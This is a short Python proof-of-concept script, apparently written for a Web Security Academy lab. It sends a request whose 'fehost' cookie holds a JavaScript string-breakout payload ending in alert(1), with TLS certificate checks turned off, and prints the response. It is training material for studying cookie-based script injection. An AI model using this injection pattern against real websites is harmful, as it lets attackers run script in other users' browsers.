import http.client
import ssl
import urllib.parse

LAB_ID = "???"


def GET_(
        fehost: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'cookie': f'fehost={urllib.parse.quote(fehost)}',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


response = GET_(fehost="""x"}; alert(1); y={"x":"y""")
print(f"response: {response.status}")
for header, value in response.headers.items():
    print(f"{header}: {value}")
print(response.read().decode())
